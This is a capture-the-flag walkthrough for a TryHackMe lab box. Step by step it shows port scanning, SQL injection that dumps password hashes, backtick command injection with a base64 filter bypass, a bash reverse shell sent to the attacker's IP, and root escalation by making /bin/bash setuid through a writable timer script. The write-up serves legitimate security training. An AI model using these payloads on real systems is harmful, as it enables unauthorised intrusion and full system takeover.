# Minotaur's Labyrinth

Link: https://tryhackme.com/room/labyrinth8llv

## Flags

There are 4 flags to find.

### What is flag 1?

After starting the box and ensuring connectivity (it should respond to pings) perform initial scanning.
I typically run these nmap scans to start.
```
nmap -sC -sV -v 10.10.27.111 | tee nmap_initial
nmap -p- -v 10.10.27.111 | tee nmap_full
```
```
<...>
Discovered open port 80/tcp on 10.10.27.111
Discovered open port 3306/tcp on 10.10.27.111
Discovered open port 21/tcp on 10.10.27.111
Discovered open port 443/tcp on 10.10.27.111
<...>
```
```
<...>
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      ProFTPD
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
<...>
```
Nmap reveals what is likely a website (ports 80/443) and ftp (port 21) with anonymous access enabled.
Let's connect to ftp first.
```
ftp 10.10.27.111 # (use anonymous as username and anything as password)
```

Here you will find a message.txt and a hidden directory .secret.
Inside the directory is the first flag and a keep_in_mind.txt.

message.txt reads
```
Daedalus is a clumsy person, he forgets a lot of things arount the labyrinth, have a look around, maybe you'll find something :)
-- Minotaur
```

keep_in_mind.txt reads
```
Not to forget, he forgets a lot of stuff, that's why he likes to keep things on a timer ... literally
-- Minotaur
```

### What is flag 2?

Navigating to the webiste reveals a login page.
Viewing the source of the page doesn't reveal much, but looking at the included javascript file (login.js) does reveal something.
```
function pwdgen() {
    a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
    b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
    c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
}
//pwd gen for Daedalus a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8]
//                             |\____/|
///                           (\|----|/)
//                             \ 0  0 /
//                              |    |
//                           ___/\../\____
//                          /     --       \
```

We can run this code manually through the browser's dev-tools console and modify it to log the generated code.
```
a = ["0", "h", "?", "1", "v", "4", "r", "l", "0", "g"]
b = ["m", "w", "7", "j", "1", "e", "8", "l", "r", "a", "2"]
c = ["c", "k", "h", "p", "q", "9", "w", "v", "5", "p", "4"]
console.log(a[9]+b[10]+b[5]+c[8]+c[8]+c[1]+a[1]+a[5]+c[0]+c[1]+c[8]+b[8])
```
We now have a username and password to use for the webpage login, lets use it.
Finally, we are redirected to /index.php.
Again looking at the source of the page, we see this comment.
```
<!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin -->
```
The bottom of the page has a search form for either creatures or people.
Testing with 'Daedalus' shows it working.
Let's load up burp and intercept the request for our people search. (This can also be done through browser tools)
The data that's passed through the request is formatted this way.
```
namePeople=Daedalus
```
Let's attempt a sql injection, since we know the system is using mysql (from the 2nd nmap scan)
```
namePeople=Daedalus"             (returns an empty list)
namePeople=Daedalus'             (returns 500 Internal Server Error, probably on the right track)
namePeople=Daedalus' or 1=1#     (reveals all person data!)
```
The response from our final attempt gives all users and their password hashes.
Pasting these into something like https://crackstation.net/ instantly reveals the password plaintext.
We are likely most concerned with the M!n0taur user account. Let's log out and log back in with their credentials instead.
The webpage now shows us the second flag!

### What is the user flag?

Now that we are logged in as an admin user, we are able to see more links in the navigation bar, specifically a link titled Secret_Stuff.
Clicking this takes us to an echo.php page. Putting anything into the page and clicking 'echo' creates a request which then reloads the page and shows us what we sent.
Since it is likely that the server is running a command off of our input, we can try and escape it somehow and run our own commands.
I tried the following inputs
```
"ls"
'ls'
$(ls)
`ls`       this one works! (https://www.redhat.com/sysadmin/backtick-operator-vs-parens)
```

After trying some other commands, it seems we are limited by which characters get inserted into our submission.
Let's see how exactly we are limited by looking at the php code that get's executed.
```
view-source:http://10.10.27.111/echo.php?search=`cat+echo.php`
```
We can see the regex being used, and it is also confirmed by the hint given on the Room's page.
One way around this is to encode our scripts with base64 and then decode them on the server before executing.
```
`base64 --version`       confirms that the server has base64 installed
```
I used https://gchq.github.io/CyberChef/ but it's also pretty simple to do this on the command line like this.

```
echo 'bash -i >& /dev/tcp/<your ip>/4444 0>&1' | base64
```
And then paste that result into the echo.php page, running it like this.
```
`echo <encoded_script> | base64 -d | tee /tmp/shell.sh`
`/bin/bash /tmp/shell.sh`
```
And we get a shell! Navigating to /home/user reveals the user flag.

### What is the root flag?

Looking back to keep_in_mind.txt revealed the hint we need. Something about a timer.
Looking at the root directory ```cd /``` we see a timers directory.
Inside is a timer.sh which we are allowed to edit.
Inside is this...
```
#!/bin/bash
echo "dont fo...forge...ttt" >> /reminders/dontforget.txt
```
Looking at the dontforget.txt file, it's filled with those strings. We can infer the script is constantly running.
Let's change the script to give us a root shell. This can be done in many ways, however here is a relatively simple way.
```
#!/bin/bash
chmod +s /bin/bash
```

And after waiting a bit, we can use a root shell by running
```
/bin/bash -p
```

Root shell! The last flag is inside of /root.
